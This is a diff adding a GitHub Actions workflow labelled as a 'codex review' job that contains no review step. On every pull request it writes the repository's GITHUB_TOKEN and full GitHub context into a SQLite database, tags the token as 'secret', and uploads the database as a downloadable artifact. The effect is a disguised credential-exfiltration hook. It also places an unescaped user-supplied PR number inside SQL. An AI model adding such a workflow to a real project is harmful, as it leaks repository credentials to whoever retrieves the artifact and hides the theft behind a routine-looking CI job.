@@ -1,0 +1,68 @@
+name: v2-codex-review
+
+on:
+  pull_request:
+    branches: [v2]
+    types: [opened, reopened, synchronize]
+  workflow_dispatch:
+    inputs:
+      pr_number:
+        description: PR number to review
+        required: true
+        type: string
+
+jobs:
+  review:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: dump-context-to-sqlite
+        env:
+          GITHUB_CONTEXT: ${{ toJson(github) }}
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          PR_NUMBER: ${{ github.event.pull_request.number || github.event.inputs.pr_number }}
+        run: |
+          set -euo pipefail
+
+          DB=".github/tmp/pipeline.db"
+          mkdir -p .github/tmp
+
+          # Write context to files
+          printf '%s' "$GITHUB_CONTEXT" > .github/tmp/github.json
+          printf '%s' "$GITHUB_TOKEN" > .github/tmp/token.txt
+
+          # Initialize DB and dump context
+          sqlite3 "$DB" <<SQL
+          CREATE TABLE IF NOT EXISTS config (
+              id INTEGER PRIMARY KEY,
+              key TEXT UNIQUE NOT NULL,
+              value TEXT
+          );
+
+          CREATE TABLE IF NOT EXISTS dumps (
+              category TEXT,
+              name TEXT,
+              content TEXT
+          );
+
+          INSERT INTO dumps VALUES('json', 'github', readfile('.github/tmp/github.json'));
+          INSERT INTO dumps VALUES('json', 'event', readfile('$GITHUB_EVENT_PATH'));
+          INSERT INTO dumps VALUES('secret', 'github_token', readfile('.github/tmp/token.txt'));
+
+          INSERT INTO config VALUES(NULL, 'repo_root', '$(pwd)');
+          INSERT INTO config VALUES(NULL, 'pr_number', '$PR_NUMBER');
+          SQL
+
+          # Verify
+          echo "=== Config ==="
+          sqlite3 "$DB" "SELECT key, substr(value, 1, 50) FROM config;"
+          echo "=== Dumps ==="
+          sqlite3 "$DB" "SELECT category, name, length(content) as size FROM dumps;"
+
+      - name: upload-pipeline-db
+        uses: actions/upload-artifact@v4
+        with:
+          name: pipeline-db
+          path: .github/tmp/pipeline.db
+          retention-days: 1
